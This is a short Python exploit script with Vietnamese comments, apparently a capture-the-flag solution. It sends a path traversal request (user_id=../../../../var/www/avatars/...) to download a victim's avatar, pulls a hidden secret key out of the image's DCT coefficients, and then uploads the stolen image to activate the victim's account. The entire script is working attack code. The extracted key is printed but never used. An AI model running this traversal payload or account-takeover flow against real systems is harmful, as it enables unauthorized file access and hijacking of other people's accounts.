import requests
import cv2
import numpy as np

TARGET_URL = "http://challenge.com/get-avatar?user_id=../../../../var/www/avatars/user_1001.png"
ACTIVATE_URL = "http://challenge.com/activate-account"

# Tải avatar của nạn nhân qua LFI
response = requests.get(TARGET_URL)
if response.status_code == 200:
    with open("stolen_avatar.png", "wb") as f:
        f.write(response.content)
    print("[+] Đã tải ảnh avatar của nạn nhân!")
else:
    print("[-] Không thể tải ảnh nạn nhân!")

# Trích xuất Secret Key từ ảnh
def extract_secret_key(image_path):
    img = cv2.imread(image_path, cv2.IMREAD_GRAYSCALE)
    h, w = img.shape
    extracted_bits = ""

    for i in range(0, h, 8):
        for j in range(0, w, 8):
            dct_block = cv2.dct(np.float32(img[i:i+8, j:j+8]))
            bit = '1' if dct_block[4, 4] % 2 != 0 else '0'
            extracted_bits += bit

    extracted_text = "".join(chr(int(extracted_bits[i:i+8], 2)) for i in range(0, len(extracted_bits), 8))
    return extracted_text

# Giải mã secret key
secret_key = extract_secret_key("stolen_avatar.png")
print(f"[+] Secret Key trích xuất: {secret_key}")

# Sử dụng secret key để kích hoạt tài khoản
files = {"file": open("stolen_avatar.png", "rb")}
response = requests.post(ACTIVATE_URL, files=files)

if "Tài khoản đã kích hoạt" in response.text:
    print("[+] Đã kích hoạt tài khoản thành công!")
else:
    print("[-] Kích hoạt thất bại!")
